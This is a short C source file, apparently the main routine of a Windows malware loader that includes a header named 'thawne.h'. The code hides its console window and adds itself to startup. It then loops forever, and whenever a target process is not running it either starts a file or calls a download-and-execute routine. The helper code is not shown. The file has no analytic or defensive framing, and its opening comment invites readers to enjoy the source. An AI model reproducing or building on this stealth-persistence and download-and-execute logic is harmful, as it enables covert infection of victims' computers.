/*

Have a good time reading the source. You are an amazing person.

*/

#include "thawne.h"

int main(int argc, char* argv[])
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    AddToStartup();
    while (TRUE)
    {
        if(ProcessId(FILENAME) == 0)
        {
            if(isFile(FILEPATH) == FALSE){
                DownloadExecute();
            } else {
                StartProcess(FILEPATH);
            }
        }
    }
}
